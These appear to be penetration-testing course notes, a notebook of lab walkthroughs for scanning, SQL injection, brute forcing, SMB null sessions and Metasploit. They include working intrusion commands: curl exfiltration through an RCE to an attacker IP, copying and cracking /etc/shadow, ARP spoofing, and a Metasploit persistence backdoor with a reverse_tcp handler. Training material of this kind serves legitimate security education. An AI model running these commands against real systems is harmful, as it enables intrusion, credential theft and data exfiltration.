# %% [markdown]
# # 1- Inforamtion Gathering:
#
# >> Information Gathering Websites:
#    - OSINT Framework (Very IMPORTANT)
#    - Shodan.io
#    - Whois
#    - Maltego
#
# >> Subdomain Enumeration:
#    - sublist3r (kali - IMPORTANT)
#    - Google's search engine (site: domain_name)
#    - dnsdumpster.com

# %% [markdown]
# # 2- Footprinting and Scanning:
#
# >> Getting live devices on a network by "ping sweeping":
#    - Fping (kali tool)
#      - (fping -a -g ip_range) "-alive -sweep"
#      - (fping -a -g 10.54.12.0/24 2>~/Desktop/null) type the error in the null file
#      - (fping -a -g 10.54.12.0 10.54.12.255 2>~/Desktop/null)
#
#    - Nmap
#      - (nmap -sn ip_range) "ping scan"
#      - (nmap -sn 10.54.12.0/24)
#      - (nmap -sn 10.54.12.*)
#      - (nmap -sn 10.54.12.1-255)
#      - (nmap -sn -iL Desktop/hosts) get ip range from a list
#      - (nmap -n ip_range) "Never do DNS resolution"
#
#
# >> Getting OS data "OS Fingerprinting":
#    - Nmap
#      - (nmap -Pn -O ip_addr) for skipping the ping process "live machines"
#      - (nmap -O ip_addr) with ping process first to get the live machines
#      - (nmap -O 10.54.12.*)
#
#
# >> Getting Opening Ports "Port Scanning":
#    - Nmap
#      - TCP SYN Scan Stealthy (nmap -sS ip_addr) => (nmap -sS 10.54.12.2)
#      - TCP Connection Scan (nmap -sT ip_addr) => (nmap -sT 10.54.12.2) "logged"
#      - Version Detection Scan (nmap -sV ip_addr) => (nmap -sV 10.54.12.2)
#
#      - (nmap -p ports_num ip_addr) => (nmap -p 21,22,80 192.168.1.1)
#      - (nmap -p ports_num_range ip_addr) => (nmap -p 10-100 192.168.1.1)
#
#
# >> Getting Open ports - Version - OS scans:
#    - (nmap -sS -sV -O ip_addr)
#    - (nmap -A ip_addr) "best"

# %% [markdown]
# # 02.6- Networking – Part 6 (Find The Secret Server Lab)
#
# >> Adding a Route to reach the Secret Server
#    - ip route add Net_add/mask via Get_way
#    - ip route add 192.168.222.0/24 via 10.175.34.1

# %% [markdown]
# # 02.9- Networking – Part 8 (Data Exfiltration Lab) – NEW
#
# >> Exploiting the RCE valnurability
#    - Open the Nmap tool to find the open ports to connect to the server
#    - In your browser navigate to (demo.ine.local:8000)
#    - Now type your commands like this (demo.ine.local:8000?cmd=ls+-l) to show the data in the working directory
#
#    - (demo.ine.local:8000?cmd=curl+-h) to see if the curl command is installed or not
#    - on my device type (ifconfig) to showh the ip address of my device
#
#    - Now to need make our device as http server
#    - type the python code in a file and name it like "server.py"
#    - now we need to run the code to make the device act like a http server, port = 80
#    - in the terminal type (python server.py 80) => (python file_name Port)
#
#    - (demo.ine.local:8000?cmd=curl+Your_IP+--upload-file+File_Name) to start transfaring the data to the kali device
#    - (demo.ine.local:8000?cmd=curl+192.168.1.5+--upload-file+flag.zip)
#    - (unzip flag.zip) to extract the file

# %% [markdown]
# # 3- Web Application Attacks Part 1:
#
#
# >> Fingerprinting with Httprint "Automatic Banner Grabbing for":  (Best)
#    - (httprint -P0 -h ip_addr -s signature_file)
#    - (httprint -P0 -h 1.2.3.4 -s /usr/share/httprint/signatures.txt)
#
# -----------------------------------------------------------------------------------
#
# >> Fingerprinting with Netcat "Manual Banner Grabbing for HTTP":
#    - (netcat -v ip_addr port_num
#       HEAD / HTTP/1.0
#
#
#       )
#
#    - (netcat -v hack.me 80
#       HEAD / HTTP/1.0
#
#
#       )
#
#
# >> Fingerprinting with OpenSSL "Manual Banner Grabbing for HTTPS":
#    - (openssl s_client -connect ip_addr:port_num
#       HEAD / HTTP/1.0
#
#
#       )
#
#    - (openssl s_client -connect hack.me:443
#       HEAD / HTTP/1.0
#
#
#       )

# %% [markdown]
# # 3- Web Application Attacks Part 2:
#
#
# >> Exploiting Misconfigured HTTP Verbs "Get enabled Methods":
#    - (nc -v ip_addr port_num
#       OPTIONS / HTTP/1.0
#
#
#       )
#
#    - (nc -v hack.me 80
#       OPTIONS / HTTP/1.0
#
#
#       )

# %% [markdown]
# # 3- Web Application Attacks Part 3:
#
#
# >> Exploiting Web Application:
#    - On you kali (ip addr) to get your IP
#    - (nmap -sn 10.104.11.0/24) Sweep ping scan to get all live machines
#    - (nmap -sV 10.104.11.IPs) to get the Version of the Services on these servers
#    - (Open the Wep app with your browser and inspect it)
#
#    - (Use Dirbuster to get the Directories of the Web Application)
#    - In the Terminal (dirbuster)
#    - Type(Target_URL - Choose Dictionary Scanning)
#    - Dictionary file (/usr/shared/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt)
#    - In result tab (look for signup - config pages)
#
#    - (mysql -u username -pPASS -h ip_addr) to make a connection with the web server
#    - (mysql -u awe -pPASSWORD -h 10.104.11.198) if it right you will make a sql connection
#
#    - (SHOW DATABASES;) to show the Databases in the DB server
#    - (USE DB_name;) to open the DB
#    - (SHOW TABLES;) to show the Tables in the DB
#    - (SELECT * FROM Table_name) to show all data in the Table

# %% [markdown]
# # 3- Web Application Attacks Part 4:
#
# >> Google Dorks:
#    - (site: ) include only results on a given hostname
#      - (ejpt site:example.com)
#
#    - (intitle: ) filters according to the title of the page
#      - (ejpt intitle:admin)
#
#    - (inurl: ) filters according to the URL of a resource
#      - (ejpt inurl:admin)
#
#    - (filtetype: ) filters by using the file extension of the resource
#      - (ejpt filetype:pdf)
#
#    - (AND, OR, &, |) using of logical operators
#      - (example.com OR example1.com)
#
#    - (- ) filter out a keywork from the query
#      - (example.com -admin) excluding the admin pages
#
#
# >> IMPORTANT:
#    - Using the Google Hacking Database (exploit.db)

# %% [markdown]
# # 3- Web Application Attacks Part 7:
#
#
# >> SQL Injection:
#    - Test the SQL injection by editing the Bage URL
#    - (example.com/news.php?id=26) to test this first use the '
#    - (example.com/news.php?id=26') if you have an error then it might be vulnerable
#    - (example.com/news.php?id=26 and 1=1 -- -) if the content still appeared
#    - (example.com/news.php?id=26 and 1=2 -- -) if the content disappeared then its vulnerable
#
#
# >> Test with SQLMap:
#    - Open the Cmd
#    - (sqlmap -u example.com/news.php?id=26) and press enter to get the results of testing
#    - (sqlmap -u example.com/news.php?id=26 --tables) to get the DB tables
#
#    - (sqlmap -u example.com/news.php?id=26 -D DB_name -T Table_name --dump) to get all data from this table
#    - (sqlmap -u example.com/news.php?id=26 -D awd -T accounts --dump) get the accounts data

# %% [markdown]
# # 4- System Attacks Part 1:
#
# >> Back Door:
#    - Server Back Door exists in the Victim's machine
#    - Client Back Door exists in the Attacker's machine
#
#
# >> Connect back Back Door:
#    - Client Back Door exists in the Victim's machine
#    - Server Back Door exists in the Attacker's machine

# %% [markdown]
# # 5- Network Attacks Part 1:
#
# >> Network Services Attacks:
#    - We use "Hydra" to crack services like "ssh - telnet - ...."
#    - (hydra rdp://ip_addr/domain_name -I User_name -p Pass)
#    - (hydra rdp://192.168.0.1/firstdomainname -I john -p doe)
#
#    - (hydra -L list.txt -P pass.txt service://server_ip option)
#    - (hydra -L users.txt -P pass.txt ftp://192.168.0.1)

# %% [markdown]
# # 5- Network Attacks Part 2:
#
# >> Brute Force and Password Cracking "Network Authentication Cracking":
#    - (nmap -sn 192.168.99.0/24) > ping sweep to get the live devices
#    - (nmap -sV 192.168.99.22) > Service scan with version
#
#    - (hydra -L list_of_users -P list_of_pass service://server_ip)
#    - (hydra -L /usr/share/ncrack/minimal.txt -P /usr/share/seclists/Passwords/reockyou.txt telnet://192.168.99.22) > Dictionary attack on the Telnet service
#    - (telnet 192.168.99.22 -l User_name) then enter the pass to check the telnet service
#
#    - (hydra -L /usr/share/ncrack/minimal.txt -P /usr/share/seclists/Passwords/reockyou.txt 192.168.99.22 ssh) > Dictionary attack on the SSH service
#    - (ssh User_name@192.168.99.22) then enter the pass to check the SSH service
#
#    - On your kali machine (scp User@192.168.99.22:/etc/passwd .) to secure copy the pass file
#    - (scp User@192.168.99.22:/etc/shadow .) to copy the pass file hashes
#
#    - (unshadow passwd shadow > Crack) >> merge the users with their hashes in one file
#    - (john Crack) >> Brute force on that file to get the passes

# %% [markdown]
# # 5- Network Attacks Part 3:
#
#
# >> Administrative Shares:
#     - on the Network tab type (\\Computer_Name\C$) to open the C volume
#     - (\\Computer_Name\Admin$) to open the windows installation dire
#
#
# >> Using nbtstat to get the shared files "Windows":
#    - on your Windows machine (nbtstat)
#    - (nbtstat -A Ip_addr) dispaly information about the target
#      - First line (Name - Device type - Have one IP or not)
#      - Second line (Workgroup or Domain device)
#      - Third line (Name - <20> Share is open)
#
#      - (NET VIEW Ip_addr) dispaly the shared files
#
#
# >> Using nmblookup to get the shared files "Kali": >> Best
#    - (nmblookup -A Ip_addr) to get information about the target
#    - (smbclient -L //IP_addr -N) to display the shared files
#
#
# >> Checking for Null Sessions with Windows:
#    - (net use \\IP_addr\IPC$ '' /u:'') Connect to the IPC$ share by empty user, pass
#
#
# >> Checking for Null Sessions with Kali:
#    - (smbclient //IP_addr/IPC$ -N) Connect to the IPC$ share by empty user, pass
#
#
# >> Exploiting Null Sessions with Enum:
#    - (enum -S IP_addr) get the shared folders
#    - (enum -U IP_addr) get the users
#    - (enum -P IP_addr) get the Password policy
#
#    - We have more tools like (Winfo - enum4linux)

# %% [markdown]
# # 5- Network Attacks Part 4:
#
# >> Null Session Exploiting:
#    - With kali make a ping sweep (nmap -sn 192.168.1.0/24)
#    - (enum4linux -n Ip_addr) > to check if the machine is vulnerable to Null Session attack
#
#    - (enum4linux -a Ip_addr) > to get data about the shared dires
#    - (smbclient \\\\ip_addr\\Shared_dire -N) > try to get in without user, pass
#
#    - (get file.txt /root/Desktop) > to copy file.txt to my machine

# %% [markdown]
# # 5- Network Attacks Part 5:
#
# >> Arp Spoofing Attacks:
#    - (echo 1 > /proc/sys/net/ipv4/ip_forward) >> to enable the ip forwarding feature in linux
#    - (arpspoof -i Interface -t target_ip -r host_ip)
#    - (arpspoof -i eth0 -t 192.168.4.11 -r 192.168.4.16)
#    - Open Wireshark to sniff the data

# %% [markdown]
# # 5- Network Attacks Part 7:
#
# >> Open Metasploit:
#    - From the Kali GUI
#    - From CMD by (msfconsole)
#
#
# >> Meterpreter Payloads:
#    - bind_tcp > runs a server process on the target machine "not recommended"
#    - reverse_tcp > performs a TCP connection back to the attacker machine

# %% [markdown]
# # 5- Network Attacks Part8 "Metasploit Lab":
#
# >> Hacking the Macnine:
#    - (nmap -sS Ip_addr) to make a ping sweeping with SYN scan
#    - (nmap -sv Ip_addr) to make a Service Version detection scan
#
#    - Then open Metasploit and search for vulnerable services you found in the target machine
#    - (msfconsole) > open metasploit
#    - (search service_name) > search for modules of the vulnerable service
#    - Now you choose the New exploit from metasploit
#    - (use Exploit_dire) > to use the Exploit
#    - (show options) > to see more details and change some of them
#    - (set "option" "data") > change data in the expoit by use command
#    - (expoit) > to start the Attack
#
#    - If the "meterpreter" session opened then the attack succeded
#    - (getsystem) > to elevate you privileges "be admin"
#    - (getuid) > to see the used user
#    - (hashdump) > to get the users hashes
#
#    - Now we install a Backdoor
#    - (background or CTRL+Z) to put the session in the background
#    - (use exploit/windows/local/persistence) >> to use the backdoor exploit
#    - (show options)
#    - (set session 1) > to set the session you use
#    - (set lhost your_ip) > to make the host your machine
#    - (set lport 5555) > to change the port
#    - if you don't see the meterpreter then you need to restart the victim machine
#    - (sessions 1) > to go Back to opened session 1
#    - (shell) > to take a shell and open cmd
#    - (shutdown /r /f) > to restart the victim machine
#    - (CRTL+Z) > to go back to the expoits
#
#    - Now we need to open the Backdoor
#    - (use exploit/multi/handler)
#    - (set lhost your_ip)
#    - (set lport 5555)
#    - (set payload windows/meterpreter/reverse_tcp)
#    - (set disablepayloadhandler false)
#    - (exploit)
#
#    - (search -f file_name) > search for files in the victim machine
#    - (download "file_path" /home/kali/Desktop) > download file from victim to the home/kali/Desktop

# %% [markdown]
# # Black Box 1:
#
# >> Hack a Server and ohter Mahcine:
#    - (ping the server to see if its alive or not)
#    - (nmap the server to see open ports)
#    - (nmap -A -O -p port_num ip_addr) >> os, version detection and script scan for specific port
#    - (search for exploits for the app that is installed on the server)
#
#    - (msfconsole) > open metasploit
#    - (search for the application that you found in the server)
#    - (use exploit_you_choose)
#    - (see options) > to change some parameters in the exploit by "set" command
#
#    - (shell) > open the cmd in the server
#    - (ifconfig) > see the IPs and NIC in the server
#
#    - (run autoroute -s net_ip -n subnet_mask) on the meterpreter to pivot unreachable networks
#    - After adding the route to the unreachable network
#    - (CTRL+Z) to go back from meterpreter to the msfconsole
#    - (use auxiliary/scanner/portscan/tcp) > to use scanning exploitation
#    - (set PORTS 80, 8080, 445, 21, 22) > choose ports to be scanned
#    - (set RHOSTS IP_range) > IP range of the unreachable network
#    - (exploit) > start the attack
#
#    - now we need to scan the opened ports
#    - we use the "portfwd" port forward to allow forwarding the remote machine port to your local machine port
#    - now go back to your opened session (session 1)
#    - (portfwd add -l 1234 -p 21 -r ip_addr) > use the port 1234 as reflection of the port 21 of the victim machine "ip_addr" of the victim
#    - (background)
#
#    - (nmap -sS -sV -p 1234 localhost) to scan port 21 on the remote machine
#    - (search for the opened app exploit you found from the scan)
#    - change some parameters then (exploit)
